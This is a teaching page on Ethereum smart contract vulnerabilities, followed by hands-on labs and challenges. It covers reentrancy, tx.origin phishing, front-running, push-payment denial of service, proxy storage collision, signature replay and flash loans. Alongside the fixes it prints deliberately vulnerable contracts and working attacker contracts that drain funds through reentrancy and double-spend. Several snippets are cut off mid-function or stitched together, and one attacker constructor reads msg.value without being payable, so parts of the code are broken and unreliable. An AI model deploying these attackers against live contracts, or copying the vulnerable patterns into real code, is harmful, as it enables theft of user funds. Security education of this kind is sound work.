Smart Contract Vulnerabilities

Reentrancy

Attacker contract calls back into the victim before the first execution completes. The DAO hack (2016) exploited this to drain ~$60M.

Single-Function Reentrancy

// VULNERABLE: sends ETH before updating balance
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        (bool ok, ) = msg.sender.call{value: amount}("");  // attacker re-enters here
        require(ok);
        balances[msg.sender] = 0;  // too late — already re-entered
    }
}

// ATTACKER
contract Attacker {
    VulnerableBank bank;
    constructor(address _bank) { bank = VulnerableBank(_bank); }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();  // re-enter before balance is zeroed
        }
    }
}

Cross-Function Reentrancy

Attacker re-enters a different function that reads the stale state:

// During the reentrancy callback, attacker calls transfer()
// which reads the not-yet-updated balance
function transfer(address to, uint256 amount) public {
    require(balances[msg.sender] >= amount);  // stale balance!
    balances[msg.sender] -= amount;
    balances[to] += amount;
}

Prevention: Checks-Effects-Interactions

function withdraw() public {
    uint256 amount = balances[msg.sender];
    require(amount > 0);           // CHECK
    balances[msg.sender] = 0;      // EFFECT (update state first)
    (bool ok, ) = msg.sender.call{value: amount}("");  // INTERACTION (external call last)
    require(ok);
}

// Or use OpenZeppelin ReentrancyGuard
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SafeBank is ReentrancyGuard {
    function withdraw() public nonReentrant {
        // safe — modifier prevents re-entry
    }
}

    function transfer(address to, uint256 amount) public {
        require(tx.origin == owner);  // BAD: tx.origin is always the EOA

// Attack: trick owner into calling attacker contract
contract TxOriginAttack {

Front-Running

Attackers monitor the mempool for pending transactions and submit their own with higher gas to execute first.

Sandwich Attack

  1. Victim submits a large DEX swap (buy token X)
  2. Attacker front-runs: buys token X first (price goes up)
  3. Victim's swap executes at a higher price
  4. Attacker back-runs: sells token X at the inflated price

Prevention: Commit-Reveal

// Phase 1: commit (hash of action + secret)
mapping(bytes32 => bool) public commits;

function commit(bytes32 hash) public {
    commits[hash] = true;
}

// Phase 2: reveal (after N blocks)
function reveal(uint256 value, bytes32 secret) public {
    bytes32 hash = keccak256(abi.encodePacked(msg.sender, value, secret));
    require(commits[hash], "No matching commit");
    delete commits[hash];
    // execute action with value
}

Other mitigations: use private mempools (Flashbots Protect), set max slippage, use batch auctions.

Denial of Service

Push vs Pull Payments

// VULNERABLE: push pattern — if one transfer fails, all fail
function distributeRewards(address[] memory winners) public {
    for (uint i = 0; i < winners.length; i++) {
        payable(winners[i]).transfer(reward);  // reverts if any recipient rejects ETH
    }
}

// SAFE: pull pattern — users withdraw individually
mapping(address => uint256) public pendingWithdrawals;

function claimReward() public {
    uint256 amount = pendingWithdrawals[msg.sender];
    require(amount > 0);
    pendingWithdrawals[msg.sender] = 0;
    payable(msg.sender).transfer(amount);
}

Storage Collision (Proxy Patterns)

When proxy uses delegatecall, the implementation's code runs against the proxy's storage. If storage layouts don't match, variables collide.

// Proxy storage layout
// slot 0: implementation address
// slot 1: admin address

// Implementation storage layout
// slot 0: owner       ← COLLIDES with implementation address!
// slot 1: value

contract BadProxy {
    address public implementation;  // slot 0
    address public admin;           // slot 1
    // ...delegatecall to implementation
}

contract Implementation {
    address public owner;   // slot 0 — overwrites proxy.implementation!
    uint256 public value;   // slot 1 — overwrites proxy.admin!
}

// FIX: Use EIP-1967 — store proxy vars in random slots
bytes32 constant IMPL_SLOT = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);

Signature Replay

// VULNERABLE: no nonce, signature can be reused
function execute(address to, uint256 amount, bytes memory sig) public {
    bytes32 hash = keccak256(abi.encodePacked(to, amount));
    address signer = recoverSigner(hash, sig);
    require(signer == owner);
    payable(to).transfer(amount);  // replay the same sig to drain funds
}

// FIX: include nonce + chain ID (EIP-712)
mapping(uint256 => bool) public usedNonces;

function execute(address to, uint256 amount, uint256 nonce, bytes memory sig) public {
    require(!usedNonces[nonce], "Nonce already used");
    usedNonces[nonce] = true;

    bytes32 hash = keccak256(abi.encodePacked(
        "\x19\x01",
        DOMAIN_SEPARATOR,  // includes chain ID
        keccak256(abi.encode(to, amount, nonce))
    ));
    address signer = ECDSA.recover(hash, sig);
    require(signer == owner);
    payable(to).transfer(amount);
}

Flash Loan Attack Vectors

Flash loans provide massive uncollateralized capital within a single transaction. Common attack chain:

  1. Borrow large amount via flash loan
  2. Manipulate price on DEX (swap large amount to skew reserves)
  3. Interact with vulnerable protocol that reads the manipulated price
  4. Profit from the price discrepancy
  5. Repay flash loan + fee

See the DeFi Attacks page for detailed flash loan exploitation.

contract VulnerableBank {

    function deposit() public payable {

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBank.sol";

contract ReentrancyAttacker {
    VulnerableBank public bank;
    address public owner;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
        owner = msg.sender;

        require(msg.value >= 1 ether, "Need at least 1 ETH");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function collect() external {
        require(msg.sender == owner);

Lab 4: Storage Collision in Proxy

Hard

Objective: Demonstrate how misaligned storage layouts between a proxy and implementation cause data corruption. Then fix it using EIP-1967 slots.

Step 1: Broken Proxy (Storage Collision)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Proxy stores impl address in slot 0
contract BrokenProxy {
    address public implementation;  // slot 0
    address public admin;           // slot 1

    constructor(address _impl) {
        implementation = _impl;
        admin = msg.sender;
    }

    fallback() external payable {
        (bool ok, bytes memory data) = implementation.delegatecall(msg.data);
        require(ok);
        assembly { return(add(data, 32), mload(data)) }
    }

    receive() external payable {}
}

// Implementation also uses slot 0 — COLLISION
contract BrokenLogic {
    uint256 public value;  // slot 0 — overwrites proxy.implementation!

    function setValue(uint256 _v) public {
        value = _v;  // this actually writes to proxy's storage slot 0
    }
}
Step 2: Test the Collision
describe("Storage Collision", function () {
  it("corrupts proxy storage", async () => {
    const Logic = await ethers.getContractFactory("BrokenLogic");
    const logic = await Logic.deploy();

    const Proxy = await ethers.getContractFactory("BrokenProxy");
    const proxy = await Proxy.deploy(await logic.getAddress());

    const proxied = Logic.attach(await proxy.getAddress());

    // This overwrites the implementation address in the proxy!
    await proxied.setValue(12345);

    // Implementation address is now corrupted
    const stored = await proxy.implementation();
    expect(stored).to.not.equal(await logic.getAddress());
    // proxy.implementation is now 0x0...3039 (12345 in hex)
  });
});
Step 3: Fix with EIP-1967
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract FixedProxy {
    // Random storage slots — won't collide with implementation
    bytes32 private constant IMPL_SLOT =
        bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);

    constructor(address _impl) {
        assembly { sstore(IMPL_SLOT, _impl) }
    }

    fallback() external payable {
        address impl;
        assembly { impl := sload(IMPL_SLOT) }
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    receive() external payable {}
}

Lab 5: Cross-Function Reentrancy

Medium

Objective: Exploit a contract where the reentrancy callback targets a different function that reads stale state, allowing double-spending.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract CrossFunctionBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0);
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok);
        balances[msg.sender] = 0;
    }

    // During withdraw's callback, attacker calls this
    function transfer(address to, uint256 amount) public {
        require(balances[msg.sender] >= amount);  // stale balance!
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}

contract CrossFunctionAttacker {
    CrossFunctionBank public bank;
    address public accomplice;

    constructor(address _bank, address _accomplice) {
        bank = CrossFunctionBank(_bank);
        accomplice = _accomplice;
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        // During withdraw callback, transfer balance to accomplice
        // Balance hasn't been zeroed yet!
        bank.transfer(accomplice, bank.balances(address(this)));
    }
    // Result: attacker gets ETH from withdraw AND accomplice gets the balance
}

Tasks:

  1. Deploy and verify the double-spend works
  2. The attacker gets ETH via withdraw + accomplice gets balance via transfer
  3. Fix the contract using Checks-Effects-Interactions pattern
  4. Would OpenZeppelin's ReentrancyGuard on just withdraw() prevent this?

Lab 6: Read-Only Reentrancy

Hard

Objective: Exploit a DeFi protocol that reads state from another contract during a reentrancy window — the state is inconsistent even though the victim only has view calls.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Vault that reports its total value
contract Vault {
    mapping(address => uint256) public deposits;
    uint256 public totalDeposits;

    function deposit() public payable {
        deposits[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    function withdraw() public {
        uint256 amount = deposits[msg.sender];
        require(amount > 0);
        // State not yet updated when callback fires
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok);
        deposits[msg.sender] = 0;
        totalDeposits -= amount;
    }

    // View function: returns "share price"
    function sharePrice() public view returns (uint256) {
        if (totalDeposits == 0) return 1 ether;
        return address(this).balance * 1 ether / totalDeposits;
    }
}

// Oracle that reads vault's share price
contract VulnerableOracle {
    Vault public vault;
    constructor(address _vault) { vault = Vault(_vault); }

    function getPrice() public view returns (uint256) {
        return vault.sharePrice();  // reads inconsistent state during reentrancy
    }
}

Key insight: During withdraw(), the ETH is sent but totalDeposits hasn't been decremented yet. The sharePrice() temporarily shows a lower value (balance decreased but totalDeposits unchanged). Any protocol reading this price during the callback gets a wrong value.

contract Relayer {

Lab 12: Commit-Reveal Implementation

Medium

Objective: Implement a commit-reveal scheme for a sealed-bid auction to prevent front-running of bids.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract SealedAuction {
    address public seller;
    uint256 public commitDeadline;
    uint256 public revealDeadline;

    struct Commit {
        bytes32 hash;
        bool revealed;
    }

    mapping(address => Commit) public commits;
    address public highestBidder;
    uint256 public highestBid;

    constructor(uint256 _commitDuration, uint256 _revealDuration) {
        seller = msg.sender;
        commitDeadline = block.timestamp + _commitDuration;
        revealDeadline = commitDeadline + _revealDuration;
    }

    // Phase 1: Submit hashed bid (bid value hidden)
    function commit(bytes32 hash) external payable {
        require(block.timestamp < commitDeadline, "Commit phase over");
        require(commits[msg.sender].hash == bytes32(0), "Already committed");
        commits[msg.sender] = Commit(hash, false);
    }

    // Phase 2: Reveal actual bid
    function reveal(uint256 bidAmount, bytes32 secret) external payable {
        require(block.timestamp >= commitDeadline, "Commit phase active");
        require(block.timestamp < revealDeadline, "Reveal phase over");
        require(!commits[msg.sender].revealed, "Already revealed");

        bytes32 hash = keccak256(abi.encodePacked(msg.sender, bidAmount, secret));
        require(hash == commits[msg.sender].hash, "Hash mismatch");
        require(msg.value == bidAmount, "Must send bid amount");

        commits[msg.sender].revealed = true;

        if (bidAmount > highestBid) {
            // Refund previous highest bidder
            if (highestBidder != address(0)) {
                payable(highestBidder).transfer(highestBid);
            }
            highestBid = bidAmount;
            highestBidder = msg.sender;
        } else {
            payable(msg.sender).transfer(bidAmount);
        }
    }

    function finalize() external {
        require(block.timestamp >= revealDeadline, "Auction not over");
        payable(seller).transfer(highestBid);
    }
}

Tasks:

  1. Deploy and simulate a 3-bidder auction
  2. Verify that bids are hidden during the commit phase
  3. Try to front-run a bid — the commit hash prevents it
  4. What happens if a bidder commits but never reveals?

Challenge 4: Reentrancy Variants — Read-Only

A vault contract is protected by a reentrancy guard on all state-changing functions. However, a DeFi protocol reads the vault's sharePrice() during the reentrancy window. Exploit the inconsistent view to overborrow from the DeFi protocol.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract GuardedVault {
    bool private locked;
    mapping(address => uint256) public shares;
    uint256 public totalShares;

    modifier nonReentrant() { require(!locked); locked = true; _; locked = false; }

        uint256 sharesToMint = msg.value;  // simplified
        shares[msg.sender] += sharesToMint;
        totalShares += sharesToMint;

        uint256 ethAmount = shareAmount * address(this).balance / totalShares;
        shares[msg.sender] -= shareAmount;

    mapping(address => uint256) public borrowed;

        borrowed[msg.sender] += value;
        payable(msg.sender).transfer(value);
    }
}
